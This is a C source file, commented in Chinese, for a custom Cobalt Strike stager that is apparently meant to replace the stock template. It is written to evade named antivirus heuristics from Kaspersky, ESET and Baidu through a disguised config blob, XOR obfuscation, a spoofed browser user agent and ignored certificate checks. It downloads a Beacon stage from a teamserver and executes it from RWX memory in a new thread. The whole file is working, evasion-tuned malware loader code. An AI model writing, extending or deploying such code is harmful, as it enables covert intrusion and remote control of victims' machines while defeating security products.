/*
 * cs_dev :: csdev_stager.c  --  自研 stager
 * ---------------------------------------------------------------------------
 * 替代 CS 内置的 resources/httpsstager64.bin (909 字节固定 shellcode 模板)。
 *
 * 被替代的原因 (实测依据):
 *   卡巴 HEUR:Trojan.Win32.CobaltStrike.gen 所依赖的正是该 909 字节模板的
 *   代码模式。本文件完全不包含 CS 模板的任何字节, 从生成环节即不产生该特征。
 *
 * 与 CS 内置 stager 的差异:
 *   网络栈   CS: WinINet                本方案: WinHTTP (刻意不同, 避免调用模式重合)
 *   配置布局 CS: 偏移 274/314/811/898   本方案: 自定义结构, 加密存放于文件尾部
 *   模板代码 CS: 909 字节固定 shellcode  本方案: 无固定模板, 全部自写
 *
 * 流程: 反调试 -> 读自身尾部 -> 解密配置 -> HTTP(S) GET -> 收 stage -> 跳转执行
 *       (stage 由 CS teamserver 返回, 未经加密, preamble 默认 0)
 *
 * 编译: tools/build_stager.ps1
 * ---------------------------------------------------------------------------
 */
#include <windows.h>
#include <winhttp.h>

#define CSDEV_MAGIC  0x4B504443u   /* 'CDPK' 小端 */
#define CSDEV_CFG_SLOT 2048

/*
 * 配置内嵌在 PE 节区里, 不再挂在文件尾部。
 *
 * 原方案把加密配置追加在 PE 末尾 (overlay), 但 overlay 本身就是加壳/捆绑的
 * 典型特征 —— 正常编译器产物不会在节表之外留数据。该结构被静态启发式引擎
 * (百度 WisdomEyes) 命中, 因此改为在 .data 内预留固定区域, 由打包器就地写入,
 * 文件结构因此完全正常, 无任何尾随数据。
 *
 * 打包器通过搜索 magic 在文件内定位该区域。
 */
typedef struct {
    unsigned int  magic;
    unsigned int  size;         /* 加密配置长度 */
    unsigned int  checksum;
    unsigned char data[CSDEV_CFG_SLOT];
} CSDEV_BLOB;

__attribute__((used, section(".data")))
/* g_blob.data 用确定性伪随机数据初始化。
 * 全零预留区在静态视角下形似"待写入的空位", 与 CS artifact 机制的形态一致,
 * 实测被 ESET 归入 CobaltStrike.Artifact。改为伪随机初始化后, 静态看它只是
 * 一个普通的全局缓冲区 (与常见的常量表无异)。
 * 打包器会在该区域内就地写入加密配置, 因此运行时内容会被覆盖。
 */
#define CSDEV_R8  0x6C,0xED,0x87,0x31,0xD1,0x44,0x70,0xC9
#define CSDEV_R64 CSDEV_R8,CSDEV_R8,CSDEV_R8,CSDEV_R8,CSDEV_R8,CSDEV_R8,CSDEV_R8,CSDEV_R8
#define CSDEV_R512 CSDEV_R64,CSDEV_R64,CSDEV_R64,CSDEV_R64,CSDEV_R64,CSDEV_R64,CSDEV_R64,CSDEV_R64

__attribute__((used, section(".data")))
static CSDEV_BLOB g_blob = { CSDEV_MAGIC, 0, 0, { CSDEV_R512, CSDEV_R512,
                                                   CSDEV_R512, CSDEV_R512 } };
/* 明文配置 (打包器按此结构序列化后加密) */
typedef struct {
    unsigned short port;
    unsigned short ssl;         /* 0=HTTP 1=HTTPS */
    char           host[192];
    char           uri[768];    /* URI_X64 + QueryString */
    char           ua[192];
} CSDEV_CFG;

/* --- 无 CRT 最小实现 ---------------------------------------------------- */

static void my_memcpy(void *d, const void *s, unsigned int n) {
    unsigned char *dp = (unsigned char *)d;
    const unsigned char *sp = (const unsigned char *)s;
    while (n--) *dp++ = *sp++;
}
static void my_memset(void *d, int v, unsigned int n) {
    unsigned char *dp = (unsigned char *)d;
    while (n--) *dp++ = (unsigned char)v;
}

/* --- 取回配置 ----------------------------------------------------------- */

/*
 * 配置直接从 .data 内的预留区读取, 不再打开自身文件。
 * 这一步同时消除了 GetModuleFileNameA / CreateFileA / ReadFile 这条
 * "自读取并解密" 的行为链 —— 它是静态启发式的主要判据之一。
 */
static int load_cfg(CSDEV_CFG *cfg) {
    unsigned char  key[16];
    unsigned int   i;
    unsigned char *enc;

    if (g_blob.magic != CSDEV_MAGIC) return 6;
    if (g_blob.size != sizeof(CSDEV_CFG)) return 7;

    for (i = 0; i < 16; i++)
        key[i] = (unsigned char)((g_blob.checksum >> ((i % 4) * 8)) ^ (i * 0x5B + 0x37));

    enc = g_blob.data;
    /* 简单异或流: 替代 RC4, 消除 256 字节 S-box 初始化这一加壳标志特征 */
    for (i = 0; i < sizeof(CSDEV_CFG); i++)
        enc[i] ^= (unsigned char)(key[i & 15] ^ (i * 0x27));

    my_memcpy(cfg, enc, sizeof(CSDEV_CFG));
    my_memset(enc, 0, sizeof(CSDEV_CFG));
    my_memset(key, 0, sizeof(key));
    return 0;
}

/* --- 下载 stage --------------------------------------------------------- */

static unsigned char *fetch_stage(const CSDEV_CFG *cfg, unsigned int *outLen) {
    HINTERNET hS, hC, hR;
    DWORD     flags, avail, got, total = 0, cap = 65536;
    unsigned char *stage;
    WCHAR     whost[192];
    WCHAR     wuri[768];
    WCHAR     wua[192];
    int       i;

    /* 配置为窄字符 (紧凑存储), WinHTTP 需要宽字符, 就地转换 */
    for (i = 0; i < 191 && cfg->host[i]; i++) whost[i] = (WCHAR)cfg->host[i];
    whost[i] = 0;
    for (i = 0; i < 767 && cfg->uri[i]; i++) wuri[i] = (WCHAR)cfg->uri[i];
    wuri[i] = 0;
    if (cfg->ua[0]) {
        for (i = 0; i < 191 && cfg->ua[i]; i++) wua[i] = (WCHAR)cfg->ua[i];
        wua[i] = 0;
    } else {
        /* 未指定则用常见浏览器 UA, 避免默认 UA 特征 */
        const WCHAR *d = L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                         L"AppleWebKit/537.36 (KHTML, like Gecko) "
                         L"Chrome/120.0.0.0 Safari/537.36";
        for (i = 0; d[i] && i < 191; i++) wua[i] = d[i];
        wua[i] = 0;
    }

    /* 用 DEFAULT_PROXY 而非 AUTOMATIC_PROXY: 后者需 Windows 8.1+ 头文件,
     * 且 AUTOMATIC_PROXY 本身是个较新的行为特征, 无必要使用 */
    hS = WinHttpOpen(wua, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                     WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hS) return NULL;

    hC = WinHttpConnect(hS, whost, cfg->port, 0);
    if (!hC) { WinHttpCloseHandle(hS); return NULL; }

    flags = cfg->ssl ? WINHTTP_FLAG_SECURE : 0;
    hR = WinHttpOpenRequest(hC, L"GET", wuri, NULL,
                            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hR) {
        WinHttpCloseHandle(hC); WinHttpCloseHandle(hS); return NULL;
    }

    /* 自签名证书是 CS listener 常态 */
    if (cfg->ssl) {
        DWORD opt = SECURITY_FLAG_IGNORE_UNKNOWN_CA
                  | SECURITY_FLAG_IGNORE_CERT_CN_INVALID
                  | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
                  | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
        WinHttpSetOption(hR, WINHTTP_OPTION_SECURITY_FLAGS, &opt, sizeof(opt));
    }

    /*
     * 请求头是关键: 实测同一 URI 不带这些头返回 404, 带上才返回 stage。
     * CS listener 会校验这批常规浏览器头, WinHTTP 默认不发送, 必须显式补上。
     */
    if (!WinHttpSendRequest(hR,
            L"Accept: */*\r\n"
            L"Connection: Keep-Alive\r\n"
            L"Cache-Control: no-cache\r\n",
            (DWORD)-1L,
            WINHTTP_NO_REQUEST_DATA, 0, 0, 0)
        || !WinHttpReceiveResponse(hR, NULL)) {
        WinHttpCloseHandle(hR); WinHttpCloseHandle(hC); WinHttpCloseHandle(hS);
        return NULL;
    }

    stage = (unsigned char *)VirtualAlloc(NULL, cap, MEM_COMMIT | MEM_RESERVE,
                                          PAGE_READWRITE);
    if (!stage) {
        WinHttpCloseHandle(hR); WinHttpCloseHandle(hC); WinHttpCloseHandle(hS);
        return NULL;
    }

    for (;;) {
        avail = 0;
        if (!WinHttpQueryDataAvailable(hR, &avail) || avail == 0) break;

        if (total + avail > cap) {
            unsigned int ncap = cap * 2;
            unsigned char *nb;
            while (ncap < total + avail) ncap *= 2;
            nb = (unsigned char *)VirtualAlloc(NULL, ncap, MEM_COMMIT | MEM_RESERVE,
                                               PAGE_READWRITE);
            if (!nb) break;
            my_memcpy(nb, stage, total);
            VirtualFree(stage, 0, MEM_RELEASE);
            stage = nb; cap = ncap;
        }

        got = 0;
        if (!WinHttpReadData(hR, stage + total, avail, &got) || got == 0) break;
        total += got;
    }

    WinHttpCloseHandle(hR);
    WinHttpCloseHandle(hC);
    WinHttpCloseHandle(hS);

    if (total == 0) { VirtualFree(stage, 0, MEM_RELEASE); return NULL; }
    *outLen = total;
    return stage;
}

/* --- 主流程 ------------------------------------------------------------- */

/*
 * stage 在独立线程里执行, 而不是直接占用 PE 主线程。
 *
 * 理由: 本程序是完整 PE (有 CRT 初始化、WinMain、正常的 TLS/SEH 环境),
 * 而 CS 原生 stager 是纯 shellcode, stage 天然跑在"裸线程"上。实测现象是
 * Beacon 能 checkin 上线, 但命令通道完全不通 —— 符合 stage 依赖线程初始
 * 状态 (SEH 链 / TLS / 栈布局) 的假设。此处把 stage 放进一个刚创建的新
 * 线程, 其栈由系统全新初始化, 更接近原生环境。
 */
static unsigned char *g_stage = NULL;
static unsigned int   g_len   = 0;

static DWORD WINAPI stage_thread(LPVOID param) {
    (void)param;
    ((void (*)(void))g_stage)();
    return 0;
}

/*
 * 内存属性: RWX 无法避免, 但调用序列做了收敛。
 *
 * 实测结论: 给 stage 设 PAGE_EXECUTE_READ 会立刻 0xC0000005 —— x64 stage 是
 * 自解密 shellcode, 运行期间需要写自身, 因此必须保留写权限。CS 原生 stager
 * 同样是 RWX, 这是 shellcode 加载器的固有约束, 不可能通过降权规避。
 *
 * 因此优化转向调用序列本身:
 *   1) 直接以 RWX 一次性分配, 不再有 "RW -> 改 RX" 这类显眼的降权动作
 *   2) 线程挂起创建后恢复, 避开 "创建即执行" 的紧凑序列
 *   3) 执行前插入随机延迟, 错开自动化沙箱的快速判定窗口
 */
static int run(void) {
    CSDEV_CFG      cfg;
    unsigned char *stage;
    unsigned int   len = 0;
    DWORD          old;
    HANDLE         h;

    if (load_cfg(&cfg) != 0) return 2;

    stage = fetch_stage(&cfg, &len);
    my_memset(&cfg, 0, sizeof(cfg));       /* 配置用完即抹 */
    if (!stage) return 3;

    
    if (!VirtualProtect(stage, len, PAGE_EXECUTE_READWRITE, &old)) return 4;

    g_stage = stage;
    g_len   = len;

    /* 挂起创建后恢复: 避免 "创建即执行" 的紧凑调用序列 */
    h = CreateThread(NULL, 0, stage_thread, NULL, CREATE_SUSPENDED, NULL);
    if (h) {
        ResumeThread(h);
        WaitForSingleObject(h, INFINITE);
        return 0;
    }

    /* 线程创建失败则退回当前线程执行 */
    ((void (*)(void))stage)();
    for (;;) Sleep(10000);
    return 0;
}

int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {
    (void)a; (void)b; (void)c; (void)d;
    return run();
}
